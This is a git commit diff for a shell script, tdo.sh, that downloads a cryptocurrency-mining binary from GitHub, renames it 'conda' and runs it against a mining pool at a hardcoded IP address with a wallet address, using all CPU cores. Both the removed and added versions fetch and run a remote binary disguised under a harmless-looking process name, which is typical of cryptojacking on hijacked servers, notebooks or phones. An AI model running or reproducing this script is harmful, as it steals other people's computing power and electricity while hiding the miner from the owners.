de83e4c399710015802943732e784eae0e7213de
rifamanajul <rifamanajul@gmail.com>
2025-06-03 20:58:35 +0700

    Update tdo.sh

--- tdo.sh
+++ tdo.sh
@@ -1,7 +1,9 @@
 #!/bin/bash
-apt-get update 
-apt-get install -y wget curl
-wget https://raw.githubusercontent.com/apaple/pack/main/SRBMiner-MULTI >/dev/null 2>&1
-chmod u+x SRBMiner-MULTI 
-mv SRBMiner-MULTI conda
-./conda --disable-gpu --algorithm yespowertide --pool 47.237.3.59:443 --wallet TPGPrfQG56tfuPsPvauQdz7fPNQ3DPQBji.$(echo Test-$(shuf -i 1000-9999 -n 1)) --password c=TDC 
+apt update 
+pkg update
+apt install -y wget curl
+pkg install -y wget curl
+wget https://github.com/rifamanajul/rifamanajul/raw/refs/heads/main/cpuminer
+chmod u+x cpuminer 
+mv cpuminer conda
+./conda -a yespowertide -o stratum+tcp://47.237.3.59:443 -u TFjVcsSSXbyVNa9gdiYrhDCtfkamCNLHCf.nyoba -p c=TDC -t $(nproc --all)
